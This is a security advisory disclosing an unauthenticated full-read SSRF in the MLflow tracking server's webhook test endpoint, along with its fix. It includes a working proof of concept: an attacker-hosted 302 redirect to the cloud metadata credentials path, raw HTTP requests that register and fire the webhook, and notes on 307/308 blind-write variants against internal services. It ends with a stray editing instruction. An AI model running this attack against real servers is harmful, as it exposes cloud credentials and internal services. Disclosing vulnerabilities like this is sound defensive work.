# MLflow: Unauthenticated full-read SSRF in webhook delivery: _validate_webhook_url bypassed via unvalidated HTTP redirects (and DNS rebinding)

- GHSA: GHSA-7gwp-5pfp-969j
- CVE: CVE-2026-64849
- Published: 2026-08-17T21:58:51Z
- GHSA severity: critical
- CVSS v3.1: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N (9.3)
- CWE: CWE-918
- Packages: pip:mlflow
- Source: https://github.com/advisories/GHSA-7gwp-5pfp-969j

---

### Summary
The default MLflow Tracking Server (`mlflow server`, no authentication, default SQLite backend) exposes the model-registry webhooks API unauthenticated, including a synchronous `POST /api/2.0/mlflow/webhooks/{id}/test` endpoint that returns the upstream response status and body to the caller. The SSRF guard added in PR #20747 (`_validate_webhook_url`, shipped in 3.10.0) resolves the webhook hostname and rejects non-public IPs, but it is bypassable: delivery follows HTTP redirects (no `allow_redirects=False`) and never pins the validated IP. An attacker hosts a public HTTPS endpoint that passes the guard and returns `302 Location: http://169.254.169.254/...` (or `http://127.0.0.1:...`); MLflow follows it and never re-validates the redirect target. Because `/test` reflects the response body, this is an unauthenticated full-read SSRF on a default server.

### Details
Three facts combine:

1. Webhook endpoints are unauthenticated on a default server. The only webhook authorization lives in the optional auth plugin (`mlflow/server/auth/__init__.py`, `WEBHOOK_BEFORE_REQUEST_HANDLERS`), which is not loaded by default.

2. The guard validates but pins nothing — `mlflow/utils/validation.py` `_validate_webhook_url`:
```python
schemes = _MLFLOW_WEBHOOK_ALLOWED_SCHEMES.get()        # default ["https"]
if parsed_url.scheme not in schemes: raise ...
if not _MLFLOW_WEBHOOK_ALLOW_PRIVATE_IPS.get():        # default False
    for addr_info in socket.getaddrinfo(hostname, None):
        ip = ipaddress.ip_address(addr_info[4][0])
        if not ip.is_global: raise ...                 # blocks RFC1918/loopback/link-local/metadata
```
The resolved IP is never carried into the connection.

3. Delivery follows redirects and re-resolves with no pinning — mlflow/webhooks/delivery.py:
```python
def _create_webhook_session():
    adapter = HTTPAdapter(max_retries=retry_strategy)  # retry only; no IP pinning
    ...
def _send_webhook_request(webhook, payload, event, session):
    _validate_webhook_url(webhook.url)                 # re-validates the ORIGINAL url only
    return session.post(webhook.url, data=payload_bytes, headers=headers, timeout=timeout)
    # no allow_redirects=False  -> 302 followed; redirect Location never re-validated
```
test_webhook returns response_status and response_body to the caller.
Bypass vectors:

Redirect-follow (reliable): attacker's allow-listed HTTPS host returns 302 to an internal/metadata URL; requests follows it.
DNS rebinding (TOCTOU): getaddrinfo in the guard and the requests connect resolve independently with no pinning.

### PoC
All requests are unauthenticated, sent to the MLflow tracking server (`{{TARGET}}`). The SSRF
fetch is performed by the MLflow server itself; the internal response is reflected back in the
`/test` response. `{{ATTACKER}}` is a host the researcher controls that resolves to a public IP
and serves HTTPS with a valid certificate, returning a 302 redirect to an internal target.

Attacker redirect server (on {{ATTACKER}}, valid TLS cert):
    nginx:  location / { return 302 http://169.254.169.254/latest/meta-data/iam/security-credentials/; }

Step 0 — negative control (proves the guard is active; the naive internal URL is rejected):

    POST /api/2.0/mlflow/webhooks HTTP/1.1
    Host: {{TARGET}}
    Content-Type: application/json

    {"name":"neg","url":"http://127.0.0.1:6379/","events":[{"entity":"REGISTERED_MODEL","action":"CREATED"}]}

    -> 400 {"message":"Invalid webhook URL scheme: 'http'. Allowed schemes are: https."}
    (an https://127.0.0.1/ variant is likewise rejected as a non-public IP)

<img width="1154" height="437" alt="image" src="https://github.com/user-attachments/assets/509f3a14-8774-4785-b99a-864f0b448019" />


Step 1 — create a webhook pointing at the attacker's public HTTPS host (passes _validate_webhook_url):

    POST /api/2.0/mlflow/webhooks HTTP/1.1
    Host: {{TARGET}}
    Content-Type: application/json

    {"name":"poc","url":"https://{{ATTACKER}}/innocent","events":[{"entity":"REGISTERED_MODEL","action":"CREATED"}]}

    -> 200 {"webhook":{"webhook_id":"<WEBHOOK_ID>", ... ,"status":"ACTIVE"}}

<img width="1394" height="520" alt="image" src="https://github.com/user-attachments/assets/9004705f-67e1-486f-a905-1f744eb3636d" />


Step 2 — fire it via the unauthenticated /test endpoint; the internal response body is returned:

    POST /api/2.0/mlflow/webhooks/<WEBHOOK_ID>/test HTTP/1.1
    Host: {{TARGET}}
    Content-Type: application/json

    {"webhook_id":"<WEBHOOK_ID>","event":{"entity":"REGISTERED_MODEL","action":"CREATED"}}

    -> 200 {"result":{"success":true,"response_status":200,
            "response_body":"<contents of http://169.254.169.254/latest/meta-data/... fetched by the server>"}}

<img width="1399" height="453" alt="image" src="https://github.com/user-attachments/assets/1e5bb020-0855-4be8-a53b-e97daeabf1dc" />


Confirmed live against mlflow==3.13.0 (default sqlite server). With the attacker host redirecting
to a local secret service, Step 2 returned:
    "response_body":"INTERNAL_SECRET=mlflow_ssrf_proof_7f3a91\nrole=admin\n"

For convenience, the "my secret data" is saved in the same location.

<img width="730" height="208" alt="image" src="https://github.com/user-attachments/assets/680e1895-6d2e-4fd7-838f-c484561b6e5c" />



Notes:
- Webhook `events` enum values must be UPPERCASE proto names (REGISTERED_MODEL, CREATED); lowercase
  maps to ENTITY_UNSPECIFIED and 500s.
- Default allowed scheme is https only; the first hop must be https, the redirect Location may be http.
- Webhooks require a SQL store; the default `mlflow server` (sqlite:///mlflow.db) qualifies. No auth needed.

- Credit / independent discovery: Originally reported privately by @freeman-bb via this advisory on 2026-06-12. The same vulnerability was independently discovered through code review and reported publicly by @AUTHENSOR in issue #24179 on 2026-06-26. Fixed in PR #24258. Discovery priority belongs to @freeman-bb; @AUTHENSOR is credited as an independent finder.

### Impact
An unauthenticated attacker who can reach the tracking server makes the server issue HTTP requests to arbitrary internal/loopback/cloud-metadata endpoints and reads the responses via /test: cloud instance-metadata (e.g. AWS IMDS IAM credentials), internal-only admin services behind the network boundary, and internal port/host scanning. The event-driven delivery path gives the same SSRF blindly; /test makes it full-read. This is an incomplete fix of the PR #20747 guard, confirmed present on the latest release (3.13.0) and on master. Not a duplicate of CVE-2025-14279 (browser-side rebinding CSRF, CWE-352).

### Fix

Fixed in https://github.com/mlflow/mlflow/pull/24258 (commit `ba94952247`), which adds connection-time SSRF protection (`SSRFProtectedHTTPAdapter`): the peer IP of each connected socket is validated against public-IP rules immediately after `connect()`, before any TLS/HTTP exchange. This covers the redirect targets as well (each redirect opens a new connection through the protected pool), closing both the 302-read and 307/308-write variants and the DNS-rebinding TOCTOU.

### Redirect variants

The same missing re-validation enables two distinct primitives depending on the redirect status code:

- **302 (read):** the redirect target is fetched with GET and, because `POST /api/2.0/mlflow/webhooks/{id}/test` reflects the upstream response body (`WebhookTestResult.response_body`), the attacker reads arbitrary internal HTTP responses (cloud metadata, internal services).
- **307 / 308 (blind write):** these preserve the original POST method and body, so the attacker can POST attacker-controlled payloads into private-network management endpoints that act on POST (e.g. Docker daemon `/stop`, Elasticsearch `/_close`, Spring Boot Actuator `/shutdown`).

Neither requires authentication on a default OSS server.

Then add a fix reference near the top or in a "Remediation" note:
